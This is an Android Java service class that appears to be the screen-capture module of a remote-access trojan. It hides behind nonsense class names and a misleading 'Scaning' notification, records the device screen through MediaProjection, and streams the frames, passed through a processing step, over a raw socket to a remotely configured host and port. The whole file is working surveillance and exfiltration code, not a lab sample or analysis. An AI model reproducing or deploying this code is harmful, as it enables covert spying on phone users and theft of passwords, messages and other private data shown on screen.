package store.apps;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;

import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;

import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;


import android.view.WindowManager;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;


public class AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg extends Service {

    private static Socket sk;
    private OutputStream out;
    private static final String CHANNEL_WHATEVER="Scaning";
    private static final int NOTIFY_ID=9906;
    static final String EXTRA_RESULT_CODE="resultCode";
    static final String EXTRA_RESULT_INTENT="resultIntent";
    static final String ACTION_RECORD=
            BuildConfig.APPLICATION_ID+".RECORD";
    static final String ACTION_SHUTDOWN=
            BuildConfig.APPLICATION_ID+".SHUTDOWN";
    static final int VIRT_DISPLAY_FLAGS=
            DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY |
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
    private MediaProjection projection;
    private VirtualDisplay vdisplay;
    final private HandlerThread handlerThread=
            new HandlerThread(getClass().getSimpleName(),
                    android.os.Process.THREAD_PRIORITY_BACKGROUND);
    private Handler handler;
    private MediaProjectionManager mgr;
    private WindowManager wmgr;
    private GbdvaRVSDAervasferbaesfrgHEDTHzfehbtadethsrtjsfgSdfg it;
    private int resultCode;
    private Intent resultData;
    // final private ToneGenerator beeper=
    // new ToneGenerator(AudioManager.STREAM_NOTIFICATION, 100);

    @Override
    public void onCreate() {
        super.onCreate();

        mgr=(MediaProjectionManager)getSystemService(MEDIA_PROJECTION_SERVICE);
        wmgr=(WindowManager)getSystemService(WINDOW_SERVICE);

        handlerThread.start();
        handler=new Handler(handlerThread.getLooper());
    }
    public static int Q ;
    public static int FPS ;

    @Override
    public int onStartCommand(Intent i, int flags, int startId) {
        if (i.getAction()==null) {
            resultCode=i.getIntExtra(EXTRA_RESULT_CODE, 1337);
            resultData=i.getParcelableExtra(EXTRA_RESULT_INTENT);
            Q = i.getIntExtra("Q",10);
            FPS = i.getIntExtra("F",5);
            foregroundify();
        }
        else if (ACTION_RECORD.equals(i.getAction())) {
            if (resultData!=null) {

                // pr();
                FindNewIcon();
            }
            else {
                Intent ui=
                        new Intent(this, SecoundActivity.class)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                startActivity(ui);
            }
        }
        else if (ACTION_SHUTDOWN.equals(i.getAction())) {
            //beeper.startTone(ToneGenerator.TONE_PROP_NACK);
            ISON = false;
            stopCapture();
            stopForeground(true);
            stopSelf();
            // beeper.startTone(ToneGenerator.TONE_PROP_ACK);
            // startCapture();

        }

        return(START_NOT_STICKY);
    }

    @Override
    public void onDestroy() {
        stopCapture();

        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new IllegalStateException("Binding not supported.");
    }

    public List<byte[]> bts = new ArrayList<byte[]>();
    public static Object syc = new Object();
    private static boolean ISON  = false;
    public boolean usd = false ,ctd = false,Lo = false;
    public void pr() {
        new Thread(new Runnable() {
            @Override
            public void run() {

                while (ISON){
                    try {
                        synchronized(syc){
                            if(ConHelpOne._is_connected_){
                                if(bts.size() > 0){
                                    byte[] pc = bts.get(0);

                                    try {
                                        byte[] b0 = DataScan1.f(ConHelpOne.scr,pc);
                                        sk.setSendBufferSize(b0.length);
                                        out = sk.getOutputStream();
                                        out.write(b0,0,b0.length);
                                        out.flush();
                                    } catch (Exception e) {
                                        ISON = false;
                                        stopCapture();
                                        stopForeground(true);
                                        stopSelf();
                                        di();

                                    }

                                    bts.remove(0);
                                }
                            }
                            else
                            {
                                stopCapture();
                                stopForeground(true);
                                stopSelf();
                                ISON = false;
                            }

                        }
                    } catch (Exception e)
                    {
                        ISON = false;
                    }catch (OutOfMemoryError e) {}
                    try{ Thread.sleep(1);} catch (InterruptedException e) {}
                }
            }
        }).start();
    }
    public void FindNewIcon() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                int t = 0;
                do {
                    if(t >= 3){stopCapture();}
                    try {

                        InetSocketAddress sock = new InetSocketAddress(InetAddress.getByName(EngineWorkerins._the_host_), Integer.parseInt(EngineWorkerins._the_port_));
                        sk = new Socket();
                        sk.setSoTimeout(0);
                        sk.setKeepAlive(true);
                        sk.connect(sock, 60000);
                        ctd = sk.isConnected();
                        if (ctd == true) {
                            out = sk.getOutputStream();
                            Lo = true;
                            startCapture();
                            ISON = true;
                            pr();
                            break;
                        }
                    } catch (UnknownHostException e) {
                        di();
                    } catch (SocketException e) {
                        di();
                    } catch (Exception e) {
                        di();
                    }
                    try{ Thread.sleep(1);} catch (InterruptedException e) {}
                    t++;
                } while (ctd == false);
            }
        }).start();
    }

    private void di() {
        Lo = false;
        try {sk.shutdownOutput();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.shutdownInput();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.getOutputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.getInputStream().close();} catch (SocketException e) {} catch (IOException e) {}
        try {sk.close();} catch (SocketException e) {} catch (IOException e) {}
        if(out != null){try {out.close();} catch (SocketException e) {} catch (IOException e) {}out = null;}
    }

    WindowManager getWindowManager() {
        return(wmgr);
    }

    Handler getHandler() {
        return(handler);
    }



    private void stopCapture() {
        if (projection!=null) {
            projection.stop();
            vdisplay.release();
            projection=null;
        }
    }

    private void startCapture() {
        projection=mgr.getMediaProjection(resultCode, resultData);
        it=new GbdvaRVSDAervasferbaesfrgHEDTHzfehbtadethsrtjsfgSdfg(this);

        MediaProjection.Callback cb=new MediaProjection.Callback() {
            @Override
            public void onStop() {
                vdisplay.release();
            }
        };

        vdisplay=projection.createVirtualDisplay("andshooter",
                it.getWidth(), it.getHeight(),
                getResources().getDisplayMetrics().densityDpi,
                VIRT_DISPLAY_FLAGS, it.getSurface(), null, handler);
        projection.registerCallback(cb, handler);
    }

    private void foregroundify() {

        Context ctx = getApplicationContext();
        Notification ntf = EngineWorkerins.Foreground(ctx,"SCAN","Screen");
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.N) {
           // DataScan1.SETFORONE = 1;
         //   st = this;
           // DataScan1.sr(ctx,new Intent(this, NotifiHelpApp.class));
            startForeground(NOTIFY_ID, ntf);
        }else{
            if (ntf != null){
                startForeground(7775,ntf);
            }
        }


//        stopSelf();
        Intent i=
                new Intent(this, AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg.class)
                        .setAction(ACTION_RECORD);

        startService(i);

    }


}